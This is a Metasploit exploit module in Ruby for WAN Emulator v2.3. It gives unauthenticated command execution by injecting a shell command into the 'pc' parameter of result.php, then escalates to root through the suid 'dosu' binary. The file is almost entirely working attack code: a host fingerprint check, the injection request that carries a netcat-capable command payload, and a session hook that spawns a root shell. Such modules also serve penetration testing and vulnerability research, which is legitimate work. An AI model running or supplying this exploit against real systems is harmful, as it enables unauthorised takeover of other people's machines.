# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;WAN Emulator v2.3 Command Execution&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a command execution vulnerability in WAN Emulator
                version 2.3 which can be abused to allow unauthenticated users to execute
                arbitrary commands under the context of the &#039;www-data&#039; user.
                The &#039;result.php&#039; script calls shell_exec() with user controlled data
                from the &#039;pc&#039; parameter. This module also exploits a command execution
                vulnerability to gain root privileges. The &#039;dosu&#039; binary is suid &#039;root&#039;
                and vulnerable to command execution in argument one.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
            &#039;Privileged&#039;     => true,
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Author&#039;         =>
                [
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039;, # Discovery and exploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;URL&#039;, &#039;http://itsecuritysolutions.org/2012-08-12-wanem-v2.3-multiple-vulnerabilities/&#039;]
                    #[&#039;OSVDB&#039;, &#039;&#039;],
                    #[&#039;EDB&#039;,   &#039;&#039;],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 1024,
                    &#039;BadChars&#039;    => "\x00",
                    &#039;DisableNops&#039; => true,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic netcat-e&#039;,
                        }
                },
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;none&#039;
                },
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Aug 12 2012&#039;
        ))
    end
 
    def on_new_session(client)
        client.shell_command_token("/UNIONFS/home/perc/dosu /bin/sh")
    end
 
    def check
 
        res   = send_request_cgi({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/WANem/result.php&#039;
        })
        if res and res.body =~ /<br><br><br><b><font color=red>Can&#039;t measure\!\! Please repeat\.<\/font><\/b><\/body>/
            return Exploit::CheckCode::Appears
        else
            return Exploit::CheckCode::Safe
        end
 
    end
 
    def exploit
 
        @peer = "#{rhost}:#{rport}"
        data  = "pc=127.0.0.1; "
        data << URI.encode(payload.raw)
        data << "%26"
        print_status("#{@peer} - Sending payload (#{payload.raw.length} bytes)")
        begin
            res = send_request_cgi({
                &#039;uri&#039;    => &#039;/WANem/result.php&#039;,
                &#039;method&#039; => &#039;POST&#039;,
                &#039;data&#039;   => data
            }, 25)
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            print_error("#{@peer} - Connection failed")
        end
        if res and res.code == 200
            print_good("#{@peer} - Payload sent successfully")
        else
            print_error("#{@peer} - Sending payload failed")
        end
    end
 
end



